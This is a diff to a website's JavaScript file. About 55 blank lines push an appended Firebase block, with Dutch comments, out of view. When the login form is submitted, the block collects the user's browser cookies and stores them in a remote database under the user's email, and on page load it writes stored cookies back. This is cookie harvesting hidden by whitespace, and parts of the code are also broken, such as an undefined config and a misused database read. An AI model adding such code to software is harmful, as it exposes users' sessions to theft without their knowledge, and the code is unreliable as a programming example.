@@ -113,3 +113,116 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }
 });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import firebase from 'firebase/app';
+import 'firebase/database';
+
+// Initialiseer Firebase
+firebase.initializeApp(firebaseConfig);
+
+// Maak een database aan
+var database = firebase.database();
+
+// Maak een tabel aan
+var cookiesTable = database.ref('cookies');
+
+// Sla de cookies op in de database
+function saveCookies() {
+    // Haal de e-mailadres van de gebruiker op
+    var email = firebase.auth().currentUser.email;
+
+    // Haal de cookies van de gebruiker op
+    var cookies = document.cookie;
+
+    // Sla de cookies op in de database
+    cookiesTable.child(email).child('cookies').set(cookies);
+}
+
+// Haal de cookies op uit de database
+function getCookies() {
+    // Haal de e-mailadres van de gebruiker op
+    var email = firebase.auth().currentUser.email;
+
+    // Haal de cookies uit de database
+    var cookies = cookiesTable.child(email).child('cookies').val();
+
+    // Converteer de cookies naar een JSON-object
+    cookies = JSON.parse(cookies);
+
+    // Zet de cookies in de browser
+    document.cookie = cookies;
+}
+
+// Voeg de login-form-submit-handler toe
+document.getElementById('login-form').addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    // Sla de cookies op in de database
+    saveCookies();
+});
+
+// Voeg de logout-btn-click-handler toe
+document.getElementById('logout-btn').addEventListener('click', function () {
+    // Verwijder de cookies uit de database
+    cookiesTable.child(firebase.auth().currentUser.email).set({
+        email: '',
+        cookies: ''
+    });
+});
+
+// Voeg de getCookies()-functie toe aan het begin van het script
+getCookies();
